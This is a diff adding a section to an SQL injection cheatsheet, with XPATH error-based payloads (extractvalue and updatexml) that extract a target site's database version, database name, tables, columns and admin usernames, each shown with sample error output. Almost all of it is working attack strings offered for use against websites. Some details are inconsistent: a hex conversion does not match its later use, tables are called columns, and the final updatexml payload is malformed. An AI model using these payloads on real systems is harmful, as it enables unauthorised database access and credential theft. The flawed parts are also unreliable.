@@ -370,6 +370,84 @@ Example:
 
 The process and the payloads for manual injecting is exactly the same. Please [click here](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi#dumping-with-the-traditional-method) to get more details.
 
+## Bypassing Error message: The used SELECT statements have a different number of columns (Third method)
+
+The third method consists on XPATH queries.
+
+**Retrieving the database version:**
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select version())))-- -```  
+
+-Using XPATH updatexml:  
+```and updatexml(null,concat(0x0a,(select version())),null)-- -```  
+
+Output error:  
+>XPATH SYNTAX ERROR: '**5.0.35**'35  
+
+**Retrieving the database name:**
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select database())))-- -```  
+
+-Using XPATH updatexml:  
+```and updatexml(null,concat(0x0a,(select database())),null)-- -```  
+
+Output error:  
+>XPATH SYNTAX ERROR: '**AUX_db**'35  
+
+**Retrieving tables**  
+
+Retrieve the first table:  
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -```
+
+-Using XPATH updatexml:  
+```and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -```
+
+Output error:  
+>XPATH SYNTAX ERROR: '**AUX_column1**'35  
+
+Retrieve the second table (*NOTE:* Replace the bold number with bigger number to retrieve the other table [limit **0**,1]. For example, number 0 will retrieve the 1st table, number 1 will do the 2nd column, number 2 will do the 3nd column and so on:
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))-- -```
+
+-Using XPATH updatexml:  
+```and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),null)-- -```
+
+Output error:  
+>XPATH SYNTAX ERROR: '**AUX_column2**'35  
+
+**Retrieving columns**  
+
+First, convert database and table's name into 0xHEX value:
+
+```
+database: AUX_db -> 0xa4155585f6462
+table: AUX_column1 -> 0x4155585f636f6c756d6e31
+```
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)))-- -```
+
+-Using XPATH updatexml:  
+```and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)),null)-- -```
+
+Output error:  
+>XPATH SYNTAX ERROR: '**admin_username**'35  
+
+**Retrieving data inside columns**
+
+Before using the following 2 queries, make sure you replace the values with your correct values you got from the website:  
+
+-Using XPATH extractvalue:  
+```and extractvalue(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))```
+
+-Using XPATH updatexml:  
+```and updatexml(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))```
+
 ## Retrieving the database  
 
 ### Dumping with DIOS  
